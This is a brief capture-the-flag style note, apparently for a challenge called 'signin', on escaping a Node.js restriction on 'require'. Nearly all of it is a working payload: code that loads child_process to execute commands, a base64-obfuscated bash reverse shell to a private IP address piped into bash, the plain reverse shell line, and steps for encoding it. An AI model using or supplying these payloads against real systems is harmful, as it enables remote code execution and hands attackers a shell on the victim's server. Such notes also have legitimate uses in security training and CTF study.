## signin

You can't use require  but u can use global.process.mainModule.constructor._load('child_process').exec('calc')

finally payload

```
global.process.mainModule.constructor._load('child_process').exec('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMzUvNDQ0NCAwPiYx|base64 -d|bash');
```

Remark:
1. encode bash reverse shell using Base64
```
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
```
2. url encode the Base64 string